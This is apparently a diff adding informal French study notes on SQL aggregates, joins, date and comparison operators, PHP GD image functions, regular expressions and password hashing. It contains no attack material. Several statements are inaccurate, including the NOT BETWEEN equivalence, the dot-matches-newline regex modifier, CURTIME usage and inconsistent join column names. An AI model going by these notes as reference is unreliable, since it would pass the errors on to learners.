+SELECT UPPER(nom) AS up_noms FROM maTable;
+==> ca ne modifie pas la table, ca modifie juste l'output
+==> apres on le recupere avec $datas['up_noms']
+
+remarque: 
+on pourrait faire 
+SELECT UPPER(nom) FROM matable; 
+sans l'alias, mais c'est pas recommandé
+
+
+Du coup, comme fonction scalaire on a:
+- UPPER() = 
+- LOWER() = 
+- LENGTH() = longueur de la string
+- ROUND(champs, nbDecimales) = arrondie
+
+
+exemple de fonction d'agregat: AVG = calcul de moyenne (somme / nb_entries) sur des entrées numeriques
+on fait comme ca 
+SELECT AVG(prix) AS prix_moyen FROM maTable;
+
+
+Il est recommandé d'utiliser les fonctions d'agregats plutot que de recuperer des données et les traiter en php, 
+pour des raisons de performance
+
+Remarque: 
+d'habitude, on fait notre requete comme ca 
+$req = $bdd->prepare("requete");
+$req->execute();
+while ($data = $req->fetch()) {
+	faire des trucs $data['pouet'];
+}
+
+$req->closeCursor();
+
+
+mais du coup, pour les fonctions d'agregat, vu que ca ne retourne qu'une seule valeur, 
+on peut directement faire
+$data = $req->fetch();
+$req->closeCursor();
+
+
+
+PAR CONTRE, il ne faut PAS melanger une fonction d'agregat avec d'autres champs
+il ne faut pas recupere d'autres champs quand on utilise une fonction d'agregat, 
+sinon c'est le bordel
+
+du coup comme fonction d'agregat on a 
+- SUM() 
+- MAX()
+- MIN()
+- COUNT() = compte le nombre d'entrées, un peu complexe a utiliser, on fait souvent COUNT(*)
+
+
+le truc des fonctions d'agregats, c est qu'on ne peut pas utiliser, genre, le prix moyen par console par exemple
+du coup on a le kw GROUP BY qui permet d'appliquer la fonction d'agregat et de retourner un tableau de la valeur de retour
+de la fonction pour chaque groupe 
+comme ca
+SELECT AVG(prix) AS prix_moyen, console FROM maTable GROUP BY console
+(on peut faire
+SELECT AVG(prix) AS prix_moyen FROM maTable GROUP BY console
+mais on ne saura pas quel prix moyen correspond a quelle console)
+
+et pour faire l'equivalent d'un where en utilisant la valeur de retour de la fonction d'agregat, on fait 
+SELECT AVG(prix) AS prix_moyen, console FROM maTable GROUP BY console HAVING prix_moyen < 50
+
+
+
+===[DATE et TIME en SQL]===
+
+on peut selectionner les dates, on peut utiliser les comparateurs WHERE maDate > '2010-04-02 15:28:42'
+quand on veut selectionner une valeure comprise dans un intervalle, on peut faire
+WHERE v > v1 AND v < v2
+ou aussi 
+WHERE v BETWEEN v1 AND v2
+
+on a la fonction NOW() qui retourne la dateTime actuelle du serveur 
+CURDATE() renvoit la date courante du serveur 
+CURTIME() renvoit l'heure courante du serveur
+(on fait
+select CURTIME(maDate) AS maDate)
+
+
+de même, on a les fonctions DAY(), MONTH(), YEAR(), HOUR(), MINUTE(), SECOND()
+qui retourne uniquement la partie qui nous interesse dans le dateTime
+
+Enfin, on peut formater une date en faisant
+DATEFORMAT()
+genre au lieu de faire comme ca
+SELECT pseudo, message, DAY(date) AS jour, MONTH(date) AS mois, YEAR(date) AS annee, HOUR(date) AS heure, MINUTE(date) AS minute, SECOND(date) AS seconde FROM minichat
+
+on fait comme ca
+SELECT pseudo, message, DATE_FORMAT(date, '%d/%m/%Y %H%i%s') AS date FROM minichat
+
+Enfin, on peut ajouter ou soustraire du temps a des dateTime
+genre
+SELECT pseudo, message, DATE_ADD(date, INTERVAL 15 DAY) AS date_expiration FROM minichat
+
+
+===[operateurs de comparaison en sql]===
+Rappel sur les operateurs de comparaison en sql 
+<
+>
+<= 
+>=
+=
+<> ou != (!= etant converti en <> lors de l'analyse, donc autant mettre <>)
+
+de plus
+val >= a AND val <= b 
+equivaut a 
+val BETWEEN a AND b
+
+et 
+
+val <= a AND val >= b 
+equivaut a 
+val NOT BETWEEN a AND b
+
+(ya pas de difference mais ya un cycle cpu supplementaire pour reecrire la seconde forme sous la premiere, donc autant ecrire
+comme la premiere forme sauf si besoin de lisibilité)
+
+pour tester la nullité, on fait 
+val IS NULL
+ou 
+val IS NOT NULL
+(on ne peut pas faire val = NULL car deux valeurs NULL peuvent avoir une valeur differente) 
+
+==> remarque importante sur la comparaison: 
+NULL en sql correspond a une valeur inconnue
+c'est pourquoi on ne peut pas faire val = NULL car on peut avoir un vrai bool alors que val vaut NULL
+si on est emmerdé parce que tout a déjà été codé avec du val = NULL, il existe un parametre de configuration sql
+transform_null_equals qui convertit lors de l'analyse, toute expression val = NULL a val IS NULL 
+et val != NULL a val IS NOT NULL
+
+enfin
+Pour des entrées non NULL, IS DISTINCT FROM est identique à l'opérateur <>. Cependant, si les deux entrées sont NULL, alors cela retourne faux et si une des deux entrées est NULL, alors cela retourne vrai. De la même façon, IS NOT DISTINCT FROM est identique à = pour les entrées non NULL mais il renvoie true si les deux entrées sont NULL et false quand une seule est NULL. Dans ces constructions, NULL n'est plus considéré comme un état inconnu mais comme une valeur. 
+
+
+
+
+
+===[jointures entre tables]===
+
+En gros, en general chaque entrée est caracterisée par un id
+genre une table "membres" chaque membre est caractérisé par un id
+or, on peut avoir une autre table genre 'objets', avec un champs 'possesseur' contenant l'id du membre qui possede l'objet
+du coup, d'une certaine maniere, les tables membres et objets sont liées entre elles par l'id de la table membres
+(il pourrait y avoir plusieurs liaisons)
+
+Or, mettons qu'on ai besoin de recupere une liste de jeux ET le nom du possesseur
+au lieu de faire 2 requetes, on peut faire une jointure
+
+on a deux types de jointures 
+- les jointures externes = retourne toutes les données meme si elle n'ont aucune correspondance 
+  |-> left join = recupere toute la 1ere table meme si pas de correspondance avec la 2e
+  |-> right join = recupere toute la 2ere table meme si pas de correspondance avec la 1e
+- les jointures internes = ne retourne que les données qui ont une correspondance dans l'autre table (bijection)
+
+par exemple on a 2 tables
+- une table "livres" qui contient des noms de livres, leurs ids et l'id de leur possesseur
+- une table "individus" qui contient le nom, prenom, age, adresse et id des individus qui possedent des livres
+
+on peut faire des join lors de requetes pour recuperer le nom des personnes possedant tel livre, etc
+maintenant, imaginons que nous ayons un individu (Louis Brogniard) dans la table individus qui ne possede aucun livre
+==> du coup son id n'apparait pas dans la table "livres"
+
+--> si on utilise une jointure INTERNE pour recuperer les noms des possesseurs, 
+    alors l'entrée Louis Brogniard n'apparaitra pas dans les resultats car la jointure interne
+    force les donnes d'une table a avoir une correspondance dans l'autre.
+
+--> si on utilise une jointure EXTERNE pour recuperer les noms des possesseurs,
+    alors toutes les entrées possesseurs apparaitront, meme celles n'ayant pas de correspondance dans
+    la table "livres" (le champs livre sera NULL)
+
+pour la suite, on va considerer la configuration suivante
+une table "books" avec les champs
+- ID (unsigned int Primary key)
+- name (varchar)
+- IDHolder (unsigned int)
+
+une table holders avec les champs
+- ID (unsigned int primary key)
+- fName (varchar)
+- lName (varchar)
+
+==> un livre peut ne pas avoir de possesseur, du coup dans la table, son champs "holder" vaut NULL
+==> un possesseur peut ne pas avoir de livres, du coup dans la table books il n'y aura aucun champs
+    où IDHolder vaut celui du possesseur
+
+
+du coup, concretement: 
+dejà, quand on fait une requete mettant en jeu plusieurs tables, on a un risque que le nom des colonnes soit "ambigu"
+c'est a dire qu'on ai un meme nom de colonne dans 2 tables differentes, du coup sql ne sait pas si on parle du champs
+de la table1 ou de la table2
+
+du coup au lieu de faire comme ca 
+SELECT nom, prenom FROM proprietaires, jeux_video
+
+on doit faire comme ca
+SELECT table1.nom, table2.prenom FROM proprietaires, jeux_video
+
+ensuite,
+pour les jointures internes, on a 2 facons de faire: 
+l'ancienne, avec le kw WHERE (c'est le where de jointure, qui est different du where utilisé d'habitude, vu qu'après, a la fin de la requete on peut rajouter un where pour filtrer les données donc...)
+la nouvelle, avec le kw JOIN (plus efficace, plus lisible et pas de lapsus)
+
+avec WHERE on fait
+SELECT books.name, holders.ID
+FROM books, holders
+WHERE books.holder = holders.ID
+
+remarque, le WHERE est optionnel, on pourrait faire, si on veut pas filtrer mais juste savoir quoi appartient a qui, faire
+SELECT books.name, holders.ID
+FROM books, holders
+
+de plus, quand on fait des jointures, on recommande d'utiliser des alias pour le retour, donc faire
+
+SELECT books.name AS bookName, holders.fName AS holderFName
+FROM books, holders
+WHERE books.holder = holders.ID
+
+remarque, on peut egalement utiliser des alias pour les noms de tables mais moi je trouve ca inutilement complexifiant
+SELECT b.name AS bookName, h.fName AS holderFName
+FROM books AS b, holders AS h
+WHERE books.holder = holders.ID
+
+ou meme, le AS etant optionnel dans ce cas (alors la on comprend plus rien)
+SELECT b.name bookName, h.fName holderFName
+FROM books b, holders h
+WHERE books.holder = holders.ID
+
+
+pour faire une jointure interne avec JOIN, on fait... pareil en fait mais on met INNER JOIN plutot que where, syntaxe comme ac
+SELECT books.name AS bookName, holders.fName AS holderFName
+FROM books INNER JOIN holders
+ON books.holder = holders.ID
+
+vala (INNER JOIN c'est pour jointure Interne)
+
+et du coup si on veut rajouter un filtre avec notre where tradi, on le rajoute a la fin, genre
+SELECT books.name AS bookName, holders.fName AS holderFName
+FROM books INNER JOIN holders
+ON books.holder = holders.ID
+WHERE books.name <> 'pouet pouet chez kiwi'
+
+voire meme
+SELECT books.name AS bookName, holders.fName AS holderFName
+FROM books INNER JOIN holders
+ON books.holder = holders.ID
+WHERE books.name <> 'pouet pouet chez kiwi'
+ORDER BY books.name ASC
+LIMIT 0, 30
+
+
+pour les jointures externes, ya 2 types de jointures externes, les left join et right join
+
+pour faire un left join (genre recuperer tous les livres meme si ya pas de possesseurs)
+on fait
+SELECT books.name AS bookName, holders.fName AS holderFName
+FROM books LEFT JOIN holders
+ON books.IDHolder = holders.ID
+
+pour faire un right join (genre recuperer tous les possesseurs meme ceux qui n'ont pas de livre)
+on fait
+SELECT books.name AS bookName, holders.fName AS holderFName
+FROM books RIGHT JOIN holders
+ON books.holderID = holders.ID
+
+si je veux tous les possesseurs et tous les livres, genre une lEFT AND RIGHT JOIN, je fais
+SELECT books.name AS bookName, holders.fName AS holdersFNames
+	FROM books
+	LEFT JOIN holders
+	ON books.IDHolder = holders.ID
+UNION
+SELECT books.name AS bookName, holders.fName AS holderFName 
+	FROM books
+	RIGHT JOIN holders
+	ON books.IDHolder = holders.ID
+
+
+En fait, en sql il existe un kw
+FULL JOIN
+ou 
+FULL OUTER JOIN
+mais c'est pas supporté par mysql 
+du coup il faut faire comme ca, union de 2 requetes, moins optimisé mais bon ca fait le travail
+
+
+
+===[images en php]===
+
+Grace a la realisations de dll, il est possible de faire en sorte que php genere des images
+c'est la lib GD (desactivée par defaut la plupart du temps)
+souvent les hebergeurs gratuits desactivent la lib GD car c'est tres gourmand en ressources cpu
+
+ya 2 facons de generer une image en php
+- soit en demandant a php de l'afficher
+- soit en demandant a php de l'enregistrer sur l'ordinateur du user 
+
+pour que le browser sache qu'il s'agit d'une image et pas de texte ou de html, ou d'autres trucs, 
+on a le header
+un header d'image c'est 
+header ("Content-type: image/png");
+ou 
+header ("Content-type: image/jpeg");
+
+
+pour creer une image on a la fonction 
+imagecreate(w, h)
+
+pour creer une image a partir d'une autre (en gros ca sera la meme image mais on pourra rajouter des truc par dessus)
+on fait 
+imagecreatefromjpeg('fichier')
+ou
+imagecreatefrompng('fichier')
+
+
+
+ensuite pour afficher l'image on fait
+imagejpeg($img)
+ou 
+imagepng($img)
+
+voila
+pour imposer l'enregistrement de l'image sur le serveur on rajoute un argument a la fonction 
+imagepng ou imagejpeg, cf la doc
+je crois que c'est
+imagejpeg($img, "nomFichierSurLeServeur");
+
+
+ensuite, pour utiliser les couleurs on a la fonction 
+imagecolorallocate($img, r, g, b)
+genre
+$white = imagecolorallocate($img, 255, 255, 255)
+
+quand on l'appelle pour la premiere fois, ca determine la couleur de fond de l'image
+ensuite, ce sera la couleur selectionnée pour faire les trucs qu'on fait ensuite (genre dessiner un rectangle plein ou vide, etc)
+
+pour ecrire du texte on a 
+imagestring($image, $police, $x, $y, $texte_a_ecrire, $couleur);
+ou 
+imagestringup //pour ecrire du texte verticalement plutot que horizontalement 
+
+pour dessiner un pixel on fait 
+ImageSetPixel ($image, $x, $y, $couleur);
+
+pour dessiner une ligne 
+ImageLine ($image, $x1, $y1, $x2, $y2, $couleur);
+
+pour dessiner une ellispe
+ImageEllipse ($image, $x, $y, $largeur, $hauteur, $couleur);
+
+pour dessiner un rectangle
+ImageRectangle ($image, $x1, $y1, $x2, $y2, $couleur);
+
+pour dessiner un polygone 
+ImagePolygon ($image, $array_points, $nombre_de_points, $couleur);
+
+
+un truc super puissant, c'est de prendre une image et de dire que telle couleur correspond a du transparent 
+genre
+imagecolortransparent($image, $couleur);
+
+ca permet de prendre un logo par exemple et de le mettre sur une image pre-existante par exemple 
+concretement on fait comme ca 
+<?php
+header ("Content-type: image/jpeg");
+
+$source = imagecreatefrompng("logo.png");
+$destination = imagecreatefromjpeg("couchersoleil.jpg");
+
+// Les fonctions imagesx et imagesy renvoient la largeur et la hauteur d'une image
+$largeur_source = imagesx($source);
+$hauteur_source = imagesy($source);
+$largeur_destination = imagesx($destination);
+$hauteur_destination = imagesy($destination);
+
+// On veut placer le logo en bas à droite, on calcule les coordonnées où on doit placer le logo sur la photo
+$destination_x = $largeur_destination - $largeur_source;
+$destination_y =  $hauteur_destination - $hauteur_source;
+
+// On met le logo (source) dans l'image de destination (la photo)
+imagecopymerge($destination, $source, $destination_x, $destination_y, 0, 0, $largeur_source, $hauteur_source, 60);
+
+// On affiche l'image de destination qui a été fusionnée avec le logo
+imagejpeg($destination);
+
+
+
+
+pour creer une miniature ou faire une redimension, on fait 
+imagecopyresampled($destination, $source, 0, 0, 0, 0, $largeur_destination, $hauteur_destination, $largeur_source, $hauteur_source);
+
+
+
+===[les regexp]===
+
+en gros ya 2 types de regex
+- posix = plus simple que pcre mais plus lent
+- pcre ==> mieux 
+
+
+ya pas mal de fonctions natives de php pour ca 
+preg_grep = 
+preg_split
+preg_quote
+preg_match = retourne un bool en fonction de si le pattern est retrouvé au moins une fois
+preg_match_all
+preg_replace
+preg_replace_callback
+
+une regex c'est une expression comprise entre 2 delimiteurs
+genre 
+#machin#
+
+apres le dernier delimiteur on peut mettre des options genre
+i = pas de casse
+S = le . designe aussi les \n
+U = ungreedy = s'arrete a la premiere occurence = expressions les plus imbriquées priment
+
+ensuite dans les symboles speciaux ya
+() = selection
+! = 
+# = delimiteur = convention
+| = ou 
+^ = debut de chaine
+$ = fin de chaine 
+[abcd] ou [^abcd]= tmtc
+[a-z]
+[A-Z]
+[0-9] ou [1-8]
+? = 0 ou 1 fois
++ = 1 ou plus
+* = 0, 1 ou plus
+{n} = present n fois
+{a, b} = present entre a et b fois
+{a, } = b = +infini
+==> genre (pouet)+
+
+si on veut mettre les caracteres speciaux a rechercher faut les echapper avec un \ 
+genre 
+quoi \? 
+mais ya pas besoin de les echapper dans un [] (sauf les #, - et ])
+
+ya aussi des classes abregees
+\d = Indique un chiffre. = Ça revient exactement à taper[0-9]
+\D = Indique ce qui n'est PAS un chiffre. = Ça revient à taper[^0-9]
+\w = Indique un caractère alphanumérique ou un tiret de soulignement. = Cela correspond à[a-zA-Z0-9_]
+\W = pas un mot
+\t = tabulation
+\n = nouvelle line
+\r = retour chariot
+\s = ce qui est un blanc
+\S = ce qui n'est pas un blanc
+. = char quelquonque
+
+
+enfin, les parentheses peuvent servir a capturer du texte
+genre
+$texte = preg_replace('#\[b\](.+)\[/b\]#i', '<strong>$1</strong>', $texte);
+($0 contient toute la regex)
+
+pour qu'une parenthese ne soit pas capturante, 
+on fait 
+(?:etvoila)
+
+===[remarque sur le stockage des pw dans les bdd]===
+
+On ne peut pas stocker des pw en clair en bdd, c'est pas responsable 
+du coup on les hash avec un algo de hashage 
+
+or, sha1, sha512, md5, etc ne sont plus des algos surs, il est possible de passer du hash vers la chaine d'origine
+du coup ya plusieurs options (cf cours de secu web)
+on peut utiliser la fonction password_hash de php qui determinera le meilleur algo compte tenu de la chaine
+et du coup pour verifier la concordance entre un pw entré par un user et un pw dans une bdd
+on utilise la fonction
+password_verify()
+
+De plus, il existe de nouvelles methodes de connexion centralisées, utilisant les logins et pw de plateformes existantes comme
+facebook, google plus, windows etc
+(openID, facebook connect, windows live id, ...)
+
+
+
+===[conclusion]===
+voila pour les bases, apres on peut approfondir avec
+- la poo
+- le modele mvc 
+- l'utilisation de framework
+
+
+
+
+
+
